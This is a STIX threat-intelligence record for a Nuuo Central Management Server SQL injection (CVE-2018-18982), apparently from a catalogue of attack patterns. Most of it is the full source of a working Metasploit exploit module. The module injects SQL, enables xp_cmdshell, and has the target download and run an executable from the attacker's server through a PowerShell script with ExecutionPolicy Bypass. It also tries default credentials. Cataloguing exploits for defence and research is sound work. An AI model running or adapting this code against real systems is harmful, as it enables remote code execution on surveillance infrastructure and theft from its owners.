{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a5956011-d338-47bb-bc93-0b4755fbdc01",
    "created": "2024-08-14T16:35:21.169771Z",
    "modified": "2024-08-14T16:35:21.169775Z",
    "name": "Nuuo Central Management Authenticated SQL Server SQLi",
    "description": " The Nuuo Central Management Server allows an authenticated user to query the state of the alarms. This functionality can be abused to inject SQL into the query. As SQL Server 2005 Express is installed by default, xp_cmdshell can be enabled and abused to achieve code execution. This module will either use a provided session number (which can be guessed with an auxiliary module) or attempt to login using a provided username and password - it will also try the default credentials if nothing is provided.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/nuuo/nuuo_cms_sqli.rb",
            "external_id": "nuuo_cms_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-18982"
        },
        {
            "source_name": "reference",
            "url": "https://ics-cert.us-cert.gov/advisories/ICSA-18-284-02"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2019/Jan/51"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/NUUO/nuuo-cms-ownage.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::Nuuo\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'            => 'Nuuo Central Management Authenticated SQL Server SQLi',\n      'Description'     => %q{\n      The Nuuo Central Management Server allows an authenticated user to query the state of the alarms.\n      This functionality can be abused to inject SQL into the query. As SQL Server 2005 Express is\n      installed by default, xp_cmdshell can be enabled and abused to achieve code execution.\n      This module will either use a provided session number (which can be guessed with an auxiliary\n      module) or attempt to login using a provided username and password - it will also try the\n      default credentials if nothing is provided.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Pedro Ribeiro <pedrib@gmail.com>'  # Vulnerability discovery and Metasploit module\n        ],\n      'References'      =>\n        [\n          [ 'CVE', '2018-18982' ],\n          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-18-284-02' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2019/Jan/51' ],\n          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/NUUO/nuuo-cms-ownage.txt' ]\n\n        ],\n      'Platform'        => 'win',\n      'Arch'            => ARCH_X86,\n      'Stance'          => Msf::Exploit::Stance::Aggressive,  # we need this to run in the foreground\n      'Targets'         =>\n        [\n          [ 'Nuuo Central Management Server <= v2.10.0', {} ],\n        ],\n      'Notes'           =>\n        {\n          'SideEffects'   => [ ARTIFACTS_ON_DISK ]\n        },\n      'Privileged'      => false,  # we run as NETWORK_SERVICE\n      'DisclosureDate'  => '2018-10-11',\n      'DefaultTarget'   => 0))\n    register_options [\n      Opt::RPORT(5180),\n      OptInt.new('HTTPDELAY', [false, 'Number of seconds the web server will wait before termination', 10]),\n      OptString.new('URIPATH', [true,  'The URI to use for this exploit', \"/#{rand_text_alpha(8..10)}\"])\n    ]\n  end\n\n\n  def inject_sql(sql)\n    res = ncs_send_request({\n      'method' => 'GETOPENALARM',\n      'user_session' => user_session,\n      'device_id' => \"#{rand_text_numeric(4)}\",\n      'source_server' => \"';#{sql};-- \",\n      'last_one' => \"#{rand_text_numeric(4)}\"\n    })\n  end\n\n  # Handle incoming requests from the server\n  def on_request_uri(cli, request)\n    unless @pl\n      print_error(\"A request came in, but the payload wasn't ready yet!\")\n      return\n    end\n    print_good('Sending the payload to CMS...')\n    send_response(cli, @pl)\n\n    Rex.sleep(3)\n\n    print_status('Executing shell...')\n    inject_sql(create_hex_cmd(\"xp_cmdshell \\\"cmd /c C:\\\\windows\\\\temp\\\\#{@filename}\\\"\"))\n    register_file_for_cleanup(\"c:/windows/temp/#{@filename}\")\n  end\n\n  def create_hex_cmd(cmd)\n    var = rand_text_alpha(2)\n    hex_cmd = \"declare @#{var} varchar(8000); select @#{var}=0x\"\n    cmd.each_byte { |b|\n      hex_cmd << b.to_i.to_s(16)\n    }\n    hex_cmd << \"; exec (@#{var})\"\n  end\n\n  def primer\n    # we need to roll our own here instead of using the MSSQL mixins\n    # (tried that and it doesn't work)\n    service_url = \"http://#{srvhost_addr}:#{srvport}#{datastore['URIPATH']}\"\n    print_status(\"Enabling xp_cmdshell and asking CMS to download and execute #{service_url}\")\n    @filename = \"#{rand_text_alpha_lower(8..10)}.exe\"\n    ps1 = \"#{rand_text_alpha_lower(8..10)}.ps1\"\n    download_pl = %{xp_cmdshell }\n    download_pl << %{'cd C:\\\\windows\\\\temp\\\\ && }\n    download_pl << %{echo $webclient = New-Object System.Net.WebClient >> #{ps1} && }\n    download_pl << %{echo $url = \"#{service_url}\" >> #{ps1} && }\n    download_pl << %{echo $file = \"#{@filename}\" >> #{ps1} && }\n    download_pl << %{echo $webclient.DownloadFile($url,$file) >> #{ps1} && }\n    download_pl << %{powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File #{ps1}'}\n\n    print_status('Injecting PowerShell payload')\n    inject_sql(\"exec sp_configure 'show advanced options', 1; reconfigure; exec sp_configure 'xp_cmdshell', 1; reconfigure; \" + create_hex_cmd(download_pl))\n    register_file_for_cleanup(\"c:/windows/temp/#{ps1}\")\n  end\n\n  def exploit\n    connect\n    ncs_login\n    fail_with(Failure::Unknown, 'Failed to login to Nuuo CMS') unless user_session\n\n    @pl = generate_payload_exe\n\n    #do not use SSL\n    ssl = datastore['SSL']\n    datastore['SSL'] = false\n\n    begin\n      Timeout.timeout(datastore['HTTPDELAY']) {super}\n    rescue Timeout::Error\n      datastore['SSL'] = ssl\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-10-11",
    "x_mitre_platforms": [
        "win'"
    ]
}